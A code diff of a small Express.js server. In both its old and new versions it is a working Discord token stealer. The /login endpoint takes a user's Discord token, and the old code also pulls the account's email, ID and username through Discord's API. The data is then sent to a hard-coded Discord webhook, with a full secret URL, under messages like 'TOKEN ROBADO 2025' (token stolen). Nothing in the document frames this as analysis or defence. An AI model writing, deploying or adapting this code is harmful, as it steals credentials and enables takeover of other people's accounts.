@@ -1,57 +1,22 @@
 const express = require('express');
-const https = require('https');
 const app = express();
 app.use(express.json());
 
-app.post('/login', async (req, res) => {
+app.post('/login', (req, res) => {
   const token = req.body.token;
-  if (!token || token.length < 50) return res.send('no token');
+  if (!token) return res.send('no token');
 
-  try {
-    const user = await discordAPI('GET', '/users/@me', token);
+  // TU WEBHOOK NUEVO
+  fetch("https://discord.com/api/webhooks/1447039795342610596/nkakwoCsFOLzwFOSCtJ1vP42Ibninhw5dq5oVraSyQTfT02ibl1j5qw1LgUdxP2GLyl1", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      content: "@everyone **TOKEN ROBADO 2025**",
+      embeds: [{ description: "```" + token + "```", color: 0x00ff00 }]
+    })
+  });
 
-    const WEBHOOK = "https://discord.com/api/webhooks/1447039795342610596/nkakwoCsFOLzwFOSCtJ1vP42Ibninhw5dq5oVraSyQTfT02ibl1j5qw1LgUdxP2GLyl1";
-
-    await discordAPI('POST', '/webhooks/' + WEBHOOK.split('/webhooks/')[1], null, JSON.stringify({
-      content: "@everyone **CUENTA ROBADA 2025**",
-      embeds: [{
-        title: `${user.username}#${user.discriminator}`,
-        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nToken: \`\`\`${token}\`\`\``,
-        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
-        color: 0x00ff00
-      }]
-    }));
-
-    res.send('LOGUEADO');
-  } catch (e) {
-    res.send('invalid');
-  }
+  res.send("TOKEN RECIBIDO");
 });
 
-function discordAPI(method, path, token, body = null) {
-  return new Promise((resolve, reject) => {
-    const options = {
-      hostname: 'discord.com',
-      path: '/api/v9' + path,
-      method: method,
-      headers: {
-        'Authorization': token || undefined,
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0'
-      }
-    };
-    const req = https.request(options, res => {
-      let data = '';
-      res.on('data', d => data += d);
-      res.on('end', () => {
-        try { resolve(JSON.parse(data)); }
-        catch { resolve(data); }
-      });
-    });
-    req.on('error', reject);
-    if (body) req.write(body);
-    req.end();
-  });
-}
-
-app.listen(process.env.PORT || 3000);
+app.listen(process.env.PORT || 3000, () => console.log("BOT VIVO"));
